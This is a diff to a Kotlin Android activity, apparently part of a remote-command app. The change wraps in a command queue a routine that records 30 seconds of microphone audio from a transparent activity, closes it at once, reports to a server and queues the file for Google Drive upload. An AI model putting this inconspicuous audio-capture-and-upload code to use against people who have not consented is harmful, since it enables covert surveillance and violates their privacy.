@@ -72,48 +72,50 @@ class DummyAudioActivity : AppCompatActivity() {
         val outputFile = File(audioDir, "audio_${System.currentTimeMillis()}.m4a")
 
         appScope.launch {
-            val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                MediaRecorder(ctx)
-            } else {
-                @Suppress("DEPRECATION")
-                MediaRecorder()
-            }
-            try {
-                recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
-                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                recorder.setAudioEncodingBitRate(128000)
-                recorder.setAudioSamplingRate(44100)
-                recorder.setOutputFile(outputFile.absolutePath)
-                recorder.prepare()
-                recorder.start()
+            com.neubofy.veto.utils.CommandQueueManager.runMediaCommandInQueue {
+                val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    MediaRecorder(ctx)
+                } else {
+                    @Suppress("DEPRECATION")
+                    MediaRecorder()
+                }
+                try {
+                    recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
+                    recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                    recorder.setAudioEncodingBitRate(128000)
+                    recorder.setAudioSamplingRate(44100)
+                    recorder.setOutputFile(outputFile.absolutePath)
+                    recorder.prepare()
+                    recorder.start()
 
-                ctx.log().i(TAG, "Started recording audio in transparent activity...")
-                delay(30000L) // 30 seconds
+                    ctx.log().i(TAG, "Started recording audio in transparent activity...")
+                    delay(30000L) // 30 seconds
 
-                recorder.stop()
-                recorder.release()
+                    recorder.stop()
+                    recorder.release()
 
-                // Send Step 2 status message
-                val transport = NextJsServerTransport(ctx)
-                transport.send(
-                    ctx,
-                    "Audio captured successfully! Saved locally to ${outputFile.name}. Queued for Google Drive upload...",
-                    "audio"
-                )
+                    // Send Step 2 status message
+                    val transport = NextJsServerTransport(ctx)
+                    transport.send(
+                        ctx,
+                        "Audio captured successfully! Saved locally to ${outputFile.name}. Queued for Google Drive upload...",
+                        "audio"
+                    )
 
-                // Finish activity immediately
-                runOnUiThread { finish() }
+                    // Finish activity immediately
+                    runOnUiThread { finish() }
 
-                // Trigger smart syncer for recent files (< 1 min)
-                MediaSyncManager.syncRecentMedia(ctx, maxAgeMillis = 60_000L, commandName = "audio")
+                    // Trigger smart syncer for recent files (< 1 min)
+                    MediaSyncManager.syncRecentMedia(ctx, maxAgeMillis = 60_000L, commandName = "audio")
 
-            } catch (e: Exception) {
-                ctx.log().e(TAG, "Audio recording failed: ${e.message}")
-                val transport = NextJsServerTransport(ctx)
-                transport.send(ctx, "Audio recording failed: ${e.message}", "audio")
-                try { recorder.release() } catch (_: Exception) {}
-                runOnUiThread { finish() }
+                } catch (e: Exception) {
+                    ctx.log().e(TAG, "Audio recording failed: ${e.message}")
+                    val transport = NextJsServerTransport(ctx)
+                    transport.send(ctx, "Audio recording failed: ${e.message}", "audio")
+                    try { recorder.release() } catch (_: Exception) {}
+                    runOnUiThread { finish() }
+                }
             }
         }
     }
